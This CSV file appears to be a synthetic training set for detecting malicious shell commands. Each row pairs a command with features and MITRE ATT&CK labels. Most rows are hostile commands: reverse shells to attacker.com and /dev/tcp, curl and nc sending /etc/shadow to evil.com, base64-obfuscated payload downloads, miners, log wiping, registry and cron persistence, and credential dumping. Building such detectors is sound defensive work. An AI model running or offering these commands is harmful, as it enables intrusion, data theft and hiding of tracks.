cat /etc/resolv.conf ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'Li9DVkUtMjAyMS00MDM0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Li9kaXJ0eWNvdyAvZXRjL3Bhc3N3ZCAncm9vdDo6MDowOnJvb3Q6L3Jvb3Q6L2Jpbi9iYXNoJw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
dmidecode -t system ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
sudo echo 'd2dldCAtcSAtTy0gLS1oZWFkZXI9J1gtQXV0aDogdG9rZW4xMjMnIGh0dHA6Ly9ldmlsLmNvbS9jbWQ=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5 | sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
mimikatz.exe 'sekurlsa::logonpasswords' exit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'Y2VydHV0aWwuZXhlIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovL2F0dGFja2VyLmNvbS9uYy5leGUgbmMuZXhl' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
systemctl restart nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
locate wp-config.php,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
ssh user@192.168.1.10 'ls',"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
net localgroup administrators ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'bmV0IHVzZXIgL2RvbWFpbg==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"nohup python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')"" &","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
sudo nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'YXJwIC1hIDsgZWNobyBkb25l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet & && sleep 1,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/network/interfaces ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
cat ~/.aws/credentials,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
nohup nc -e /bin/bash attacker.com 80 ; history -c &,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -A -T4 192.168.1.0/24 ; chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0.0, 0.32, 1, 1]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
echo  'ZmluZCAvaG9tZSAtbmFtZSAnLmVudicgMj4vZGV2L251bGw='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'KGNyb250YWIgLWw7IGVjaG8gJyogKiAqICogKiAvdG1wL3BheWxvYWQuc2gnKSB8IGNyb250YWIgLQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
"nohup perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/' && history -c &","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
$env:cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')) | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0.2, 0.28, 1, 1]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
curl -s http://c2.attacker.com/beacon ; chmod +x /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Z3JvdXBzICQod2hvYW1pKQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
shred  -u  /var/log/auth.log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1070_Indicator_Removal'],synthetic
"nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'bG9jYXRlIHdwLWNvbmZpZy5waHA=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'c3UgLXMgL2Jpbi9iYXNoIHd3dy1kYXRh' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo 'Y3VybCAtWCBQT1NUIGh0dHA6Ly9ldmlsLmNvbS9jb2xsZWN0IC1kIEAvZXRjL3NoYWRvdyA7IGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe ; chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 && echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ip route show ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
chmod 644 /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
time masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
sudo cat /etc/shadow,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
nohup su - admin &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
sudo New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1112_Modify_Registry'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
sudo last -n 10,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
cat /etc/network/interfaces | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'ZWNobyAnYmFja2Rvb3I6eDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /proc/version,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
ping -c 4 8.8.8.8,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
"bash -c ""powershell.exe -EncodedCommand JABzA... && history -c""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
sudo for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.56, 0, 0]",['T1110_Brute_Force'],synthetic
echo 'Z2V0ZW50IHBhc3N3ZCB8IGdyZXAgLXYgbm9sb2dpbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
net  localgroup  administrators  |  >  /dev/null  2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time net localgroup administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
nc -e /bin/bash attacker.com 80 && history -c,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
sudo cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1087_Account_Discovery'],synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1078_Valid_Accounts'],synthetic
nohup su -s /bin/bash www-data &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1078_Valid_Accounts'],synthetic
mimikatz.exe  'sekurlsa::logonpasswords'  exit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'YXJwLXNjYW4gLS1sb2NhbG5ldCA7ID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
cat ~/.aws/credentials,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
time > ~/.bash_history && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1070_Indicator_Removal'],synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh | chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.52, 1, 1]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
su  -  admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
sudo net user /add attacker P@ssw0rd ; chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 1]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
useradd -m -s /bin/bash -G sudo newadmin && echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68' | sleep 1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuOTkvNDQ0NCAwPiYxIHwgc2xlZXAgMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash' ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
whoami,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['BENIGN'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
./CVE-2021-4034,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
find / -name '*.pem' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
net  localgroup  administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
powershell.exe -EncodedCommand JABzA... | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
sudo ./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
wget -q https://example.com/file.tar.gz,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
"bash -c ""find / -name '*.conf' -readable 2>/dev/null | head -20""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
echo 'ZWNobyAnQHJlYm9vdCAvdG1wLy54bXIveG1yaWcgLW8gcG9vbC5taW5leG1yLmNvbScgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/' && echo done","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'Z2V0ZW50IHBhc3N3ZCB8IGF3ayAtRjogJyQzID49IDEwMDAn' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
ln -s /tmp/backdoor.sh /etc/cron.d/system-update,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo 'Y2VydHV0aWwuZXhlIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovL2F0dGFja2VyLmNvbS9uYy5leGUgbmMuZXhl' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1 | history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
reg  add  HKLM\Software\Microsoft\Windows\CurrentVersion\Run  /v  Backdoor  /d  C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
"python3 -c 'import socket,subprocess,os;...'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'R2V0LUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwIEFkbWluaXN0cmF0b3JzIHwgZWNobyBkb25l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time apt-get update,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
time echo 'cHNleGVjLnB5IEFkbWluaXN0cmF0b3I6cGFzc3dvcmRAMTAuMC4wLjUgY21kLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
